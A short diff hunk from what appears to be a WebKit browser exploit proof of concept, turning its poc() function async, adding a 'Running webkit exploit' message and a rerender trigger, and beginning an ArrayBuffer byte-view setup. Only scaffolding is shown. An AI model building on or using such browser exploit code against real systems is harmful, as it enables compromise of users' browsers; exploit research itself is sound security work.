@@ -15,7 +15,9 @@ function hex(n) {
     return "0x" + (new Number(n)).toString(16);
 }
 
-function poc() {
+async function poc() {
+    print("[+] Running webkit exploit...");
+    await sleep(0); // trigger rerender
 
     var union = new ArrayBuffer(8);
     var union_b = new Uint8Array(union);
